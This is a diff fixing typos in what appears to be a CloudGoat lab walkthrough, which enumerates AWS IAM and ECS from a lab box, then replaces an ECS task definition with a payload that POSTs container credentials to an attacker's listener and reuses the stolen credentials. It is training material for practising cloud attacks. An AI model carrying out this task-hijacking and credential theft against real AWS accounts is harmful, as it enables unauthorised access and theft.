@@ -2,16 +2,16 @@ Connect to the start ec2 "Ruse_Box" using the public IP and SSH key provided.
 
 `ssh -i cloudgoat ubuntu@<IP ADDRESS>`
 
-Configure the role crednetials 
+Configure the role credentials 
 `aws configure --profile ruse`
 
-List the privlages 
+List the privileges 
 `aws iam list --profile ruse`
 
 List ec2 instances 
 `aws ec2 describe-instances --profile ruse `
 
-List all available ecs clusters 
+List all available ECS clusters 
 `aws ecs list-clusters --profile ruse`
 
 List services in cloudgoat cluster
@@ -23,12 +23,12 @@ Download task definition
 Download template to register a new task
 `aws ecs register-task-definition --generate-cli-skeleton --profile ruse > task_template.json`
 
-Now use task_def.json to fillout template.json with the desired payload. Reference our blog for details [here](https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/)
+Now use task_def.json to fill out template.json with the desired payload. Reference our blog for details [here](https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/)
 
-Now register the tempate to repalce the current running task.
+Now register the template to replace the currently running task.
 `register-task-definition --cli-input-json file://task_template.json  --profile ruse`
 
-Wait for task to run and POST the credentiuals to your listener
+Wait for the task to run and POST the credentials to your listener
 
 With the new creds add them to "ruse_box"
 `aws configure --profile ecs`
